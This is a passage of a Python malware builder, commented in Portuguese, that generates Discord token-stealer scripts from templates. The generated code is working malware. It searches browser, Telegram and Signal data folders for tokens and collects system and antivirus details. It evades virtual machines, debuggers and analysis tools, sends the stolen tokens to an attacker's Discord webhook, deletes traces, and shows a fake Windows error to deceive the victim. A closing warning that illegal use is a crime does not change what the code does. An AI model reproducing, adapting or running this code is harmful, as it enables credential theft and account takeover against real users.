        for i, token in enumerate(tokens[:10], 1):  # Limitar a 10 tokens
            embed["fields"].append({{
                "name": f"üîê Token {{i}}",
                "value": f"```{{token}}```",
                "inline": False
            }})
            
        if len(tokens) > 10:
            embed["fields"].append({{
                "name": "üìù Nota",
                "value": f"*{{len(tokens) - 10}} tokens adicionais encontrados...*",
                "inline": False
            }})
        
        data = {{
            "content": "@everyone" if ping else "",
            "embeds": [embed]
        }}
        
        try:
            headers = {{
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }}
            
            response = requests.post(self.webhook_url, json=data, headers=headers, timeout=30)
            return response.status_code in [200, 204]
        except Exception as e:
            return False

    def run(self):
        """Executa o stealer"""
        # Verificar VM se configurado
        if {anti_vm} and self.is_virtual_machine():
            return False
            
        # Buscar tokens
        tokens = self.search_for_tokens()
        
        if tokens:
            # Enviar para webhook
            success = self.send_to_webhook(
                tokens, 
                embed_color={embed_color},
                ping={ping_user}
            )
            
            # Mostrar erro falso se configurado
            if {fake_error}:
                self.show_fake_error()
                
            return success
            
        return False

    def show_fake_error(self):
        """Mostra uma mensagem de erro falsa"""
        try:
            import ctypes
            ctypes.windll.user32.MessageBoxW(
                0,
                "O aplicativo n√£o pode ser iniciado corretamente (0xc000007b).\\n\\nClique em OK para fechar o aplicativo.",
                "Erro de Aplica√ß√£o",
                0x10
            )
        except:
            pass

if __name__ == "__main__":
    stealer = DiscordTokenStealer("{webhook_url}")
    stealer.run()
'''
    
    def _gerar_webhook_avancado(self, webhook_url: str, embed_color: int, ping_user: bool, anti_vm: bool, fake_error: bool, **kwargs) -> str:
        return f'''import os
import sys
import json
import requests
import re
import platform
import subprocess
import tempfile
import shutil
from pathlib import Path
import ctypes
from ctypes import wintypes

class AdvancedDiscordStealer:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.tokens = []
        self.system_info = {{}}
        
    def anti_analysis_checks(self):
        """T√©cnicas avan√ßadas anti-an√°lise"""
        checks = {{
            "vm_detected": False,
            "sandbox_detected": False,
            "debugger_detected": False
        }}
        
        try:
            # Detec√ß√£o de VM via WMI
            try:
                import wmi
                w = wmi.WMI()
                for bios in w.Win32_BIOS():
                    if any(x in bios.SerialNumber.upper() for x in ["VMWARE", "VIRTUAL", "VBOX"]):
                        checks["vm_detected"] = True
            except:
                pass
                
            # Detec√ß√£o de processos de an√°lise
            analysis_processes = [
                "procmon", "wireshark", "processhacker", "ollydbg", 
                "idaq", "x32dbg", "x64dbg", "fiddler", "httpdebugger"
            ]
            
            output = subprocess.check_output("tasklist", shell=True, text=True).lower()
            for process in analysis_processes:
                if process in output:
                    checks["sandbox_detected"] = True
                    break
                    
            # Detec√ß√£o de debugger
            if ctypes.windll.kernel32.IsDebuggerPresent():
                checks["debugger_detected"] = True
                
        except:
            pass
            
        return checks

    def get_comprehensive_system_info(self):
        """Coleta informa√ß√µes completas do sistema"""
        info = {{
            "computer_name": os.getenv('COMPUTERNAME', 'N/A'),
            "username": os.getenv('USERNAME', 'N/A'),
            "hostname": platform.node(),
            "processor": platform.processor(),
            "system": platform.system(),
            "version": platform.version(),
            "architecture": platform.architecture()[0],
            "ram": self.get_ram_size(),
            "antivirus": self.get_antivirus_info(),
            "display": self.get_display_info(),
            "drives": self.get_drive_info()
        }}
        return info

    def get_ram_size(self):
        """Obt√©m tamanho da RAM"""
        try:
            import psutil
            return f"{{round(psutil.virtual_memory().total / (1024**3), 2)}} GB"
        except:
            return "N/A"

    def get_antivirus_info(self):
        """Tenta detectar software antiv√≠rus"""
        av_processes = [
            "msmpeng", "avp", "bdagent", "avast", "avgui", 
            "mbam", "norton", "kaspersky", "mcafee"
        ]
        
        try:
            output = subprocess.check_output("tasklist", shell=True, text=True).lower()
            detected = []
            for av in av_processes:
                if av in output:
                    detected.append(av)
            return detected if detected else ["None detected"]
        except:
            return ["Unknown"]

    def get_display_info(self):
        """Obt√©m informa√ß√µes do display"""
        try:
            user32 = ctypes.windll.user32
            return f"{{user32.GetSystemMetrics(0)}}x{{user32.GetSystemMetrics(1)}}"
        except:
            return "N/A"

    def get_drive_info(self):
        """Obt√©m informa√ß√µes dos discos"""
        drives = []
        for drive in ["C:", "D:", "E:", "F:"]:
            try:
                total, used, free = shutil.disk_usage(drive)
                drives.append(f"{{drive}} {{round(total / (1024**3), 1)}}GB")
            except:
                continue
        return drives

    def search_extended_tokens(self):
        """Busca avan√ßada por tokens"""
        tokens = []
        
        # Locais adicionais para buscar
        extended_paths = [
            # Navegadores
            os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome'),
            os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge'),
            
            # Aplicativos de mensagem
            os.path.join(os.getenv('APPDATA'), 'Telegram Desktop'),
            os.path.join(os.getenv('APPDATA'), 'Signal'),
        ]
        
        # Buscar em arquivos JSON, SQLite, etc.
        for path in extended_paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if any(file.endswith(ext) for ext in ['.json', '.db', '.sqlite', '.ldb', '.log']):
                            try:
                                file_path = os.path.join(root, file)
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    
                                # Padr√µes de token
                                patterns = [
                                    r'[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}',
                                    r'mfa\\.[\\w-]{{84}}',
                                    r'[\\w-]{{30,90}}'  # Padr√£o gen√©rico
                                ]
                                
                                for pattern in patterns:
                                    found = re.findall(pattern, content)
                                    tokens.extend(found)
                            except:
                                pass
        
        return list(set(tokens))

    def create_advanced_embed(self, tokens, anti_analysis):
        """Cria embed avan√ßado para Discord"""
        system_info = self.get_comprehensive_system_info()
        
        # Status de an√°lise
        analysis_status = []
        if anti_analysis["vm_detected"]:
            analysis_status.append("üö´ VM Detected")
        if anti_analysis["sandbox_detected"]:
            analysis_status.append("üö´ Sandbox Detected")
        if anti_analysis["debugger_detected"]:
            analysis_status.append("üö´ Debugger Detected")
            
        if not analysis_status:
            analysis_status = ["‚úÖ Clean Environment"]
        
        embed = {{
            "title": "ü¶† Advanced Token Stealer Report",
            "color": {embed_color},
            "thumbnail": {{"url": "https://cdn.discordapp.com/attachments/1063278367358955520/1063278367358955520/discord.png"}},
            "fields": [
                {{
                    "name": "üíª System Information",
                    "value": f"""```
Computer: {{system_info['computer_name']}}
User: {{system_info['username']}}
OS: {{system_info['system']}} {{system_info['version']}}
CPU: {{system_info['processor'][:50]}}
RAM: {{system_info['ram']}}
Display: {{system_info['display']}}
```""",
                    "inline": False
                }},
                {{
                    "name": "üõ°Ô∏è Security Status",
                    "value": f"{{' | '.join(analysis_status)}}",
                    "inline": False
                }},
                {{
                    "name": "üìä Statistics",
                    "value": f"```yaml
Tokens Found: {{len(tokens)}}
Architecture: {{system_info['architecture']}}
Antivirus: {{', '.join(system_info['antivirus'])}}
Drives: {{', '.join(system_info['drives'][:3])}}
```",
                    "inline": False
                }}
            ],
            "footer": {{
                "text": "Advanced Stealer ‚Ä¢ {time.strftime('%Y-%m-%d %H:%M:%S')}"
            }},
            "timestamp": "2023-01-01T00:00:00.000Z"
        }}
        
        # Adicionar tokens
        token_chunks = [tokens[i:i+3] for i in range(0, min(len(tokens), 15), 3)]
        for i, chunk in enumerate(token_chunks, 1):
            token_text = "\\n".join([f"Token {{(i-1)*3 + j + 1}}: {{token}}" for j, token in enumerate(chunk)])
            embed["fields"].append({{
                "name": f"üîë Tokens Batch {{i}}",
                "value": f"```{{token_text}}```",
                "inline": True
            }})
            
        return embed

    def send_advanced_webhook(self, tokens, ping=False):
        """Envia dados para webhook com t√©cnicas avan√ßadas"""
        if not tokens:
            return False
            
        anti_analysis = self.anti_analysis_checks()
        
        # Se detectou an√°lise, pode optar por n√£o enviar ou enviar dados falsos
        if anti_analysis["sandbox_detected"] or anti_analysis["debugger_detected"]:
            # Opcional: n√£o enviar em ambiente de an√°lise
            return False
            
        embed = self.create_advanced_embed(tokens, anti_analysis)
        
        data = {{
            "content": "@everyone" if ping else "",
            "embeds": [embed],
            "username": "System Reporter",
            "avatar_url": "https://cdn.discordapp.com/attachments/1063278367358955520/1063278367358955520/discord.png"
        }}
        
        try:
            # T√©cnicas de evas√£o
            headers = {{
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }}
            
            # Timeout aleat√≥rio
            timeout = random.randint(20, 40)
            response = requests.post(self.webhook_url, json=data, headers=headers, timeout=timeout)
            
            return response.status_code in [200, 204]
            
        except Exception as e:
            return False

    def cleanup_traces(self):
        """Limpeza de rastros"""
        try:
            # Limpar arquivos tempor√°rios se criados
            temp_dir = tempfile.gettempdir()
            for file in os.listdir(temp_dir):
                if file.startswith("discord_temp"):
                    try:
                        os.remove(os.path.join(temp_dir, file))
                    except:
                        pass
        except:
            pass

    def execute(self):
        """Executa o stealer avan√ßado"""
        try:
            # Verifica√ß√µes de an√°lise
            if {anti_vm}:
                anti_analysis = self.anti_analysis_checks()
                if anti_analysis["sandbox_detected"] or anti_analysis["debugger_detected"]:
                    return False
            
            # Coletar tokens
            tokens = self.search_extended_tokens()
            
            if tokens:
                # Enviar para webhook
                success = self.send_advanced_webhook(tokens, ping={ping_user})
                
                # Limpeza
                self.cleanup_traces()
                
                # Erro falso
                if {fake_error}:
                    self.show_fake_error()
                    
                return success
                
        except Exception as e:
            pass
            
        return False

    def show_fake_error(self):
        """Mostra erro falso convincente"""
        try:
            ctypes.windll.user32.MessageBoxW(
                0,
                "A opera√ß√£o n√£o foi conclu√≠da com sucesso.\\n\\n"
                "O sistema n√£o pode encontrar o arquivo especificado.\\n\\n"
                "C√≥digo do erro: 0x80070002",
                "Erro do Sistema",
                0x10
            )
        except:
            pass

if __name__ == "__main__":
    stealer = AdvancedDiscordStealer("{webhook_url}")
    stealer.execute()
'''
    
    def _sair(self):
        console.print(Panel.fit(
            "[blink bold red]‚ö†Ô∏è USO ILEGAL √â CRIME! ‚ö†Ô∏è[/blink bold red]",
            border_style="red"
        ))
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        stealer = DiscordTokenStealer()
        stealer.menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]‚úó Cancelado pelo usu√°rio[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]‚úó Erro: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
